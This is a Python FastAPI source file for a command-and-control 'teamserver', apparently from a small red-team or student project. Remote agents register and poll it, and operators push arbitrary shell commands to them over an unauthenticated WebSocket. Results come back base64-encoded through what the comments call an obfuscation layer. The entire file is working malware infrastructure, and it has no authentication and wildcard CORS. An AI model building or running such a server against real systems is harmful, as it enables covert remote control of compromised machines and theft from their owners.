import uuid
import datetime
import base64
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from typing import Dict, List

app = FastAPI(title="ChimeraC2 Teamserver", version="1.0.0")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# In-Memory Real-Time State
connected_agents: Dict[str, dict] = {}
task_queues: Dict[str, List[dict]] = {}
active_operators: List[WebSocket] = []


class ConnectionManager:
    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        active_operators.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in active_operators:
            active_operators.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in active_operators:
            try:
                await connection.send_json(message)
            except Exception:
                pass


manager = ConnectionManager()


@app.post("/api/v1/beacon/register")
async def register_agent(payload: dict):
    agent_id = payload.get("agent_id")
    payload["last_seen"] = datetime.datetime.utcnow().isoformat()
    connected_agents[agent_id] = payload
    if agent_id not in task_queues:
        task_queues[agent_id] = []
    # Broadcast to Nimona & Saliha's React UI
    await manager.broadcast({"type": "AGENT_REGISTER", "agent": payload})
    return {"status": "registered", "agent_id": agent_id}


@app.post("/api/v1/beacon/poll")
async def poll_tasks(payload: dict):
    agent_id = payload.get("agent_id")
    if agent_id in connected_agents:
        connected_agents[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat()
        if agent_id in task_queues and len(task_queues[agent_id]) > 0:
            task = task_queues[agent_id].pop(0)
            return {"task": task}
    return {"task": None}


@app.post("/api/v1/beacon/result")
async def receive_result(payload: dict):
    agent_id = payload.get("agent_id")
    output = payload.get("output", "")
    # Attempt Base64 decode from Nebiyu's obfuscation layer
    try:
        decoded_output = base64.b64decode(output).decode("utf-8")
    except Exception:
        decoded_output = output
    payload["decoded_output"] = decoded_output
    await manager.broadcast({"type": "TASK_RESULT", "result": payload})
    return {"status": "accepted"}


@app.websocket("/ws/operator")
async def operator_websocket(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        # Send current fleet upon operator connection
        for agent in connected_agents.values():
            await websocket.send_json({"type": "AGENT_REGISTER", "agent": agent})

        while True:
            data = await websocket.receive_json()
            # Handle incoming command dispatch from Saliha's TerminalConsole
            if data.get("action") == "exec":
                t_id = f"task-{uuid.uuid4().hex[:6]}"
                new_task = {"task_id": t_id, "command": data.get("command")}
                t_agent = data.get("agent_id")
                if t_agent in task_queues:
                    task_queues[t_agent].append(new_task)
    except WebSocketDisconnect:
        manager.disconnect(websocket)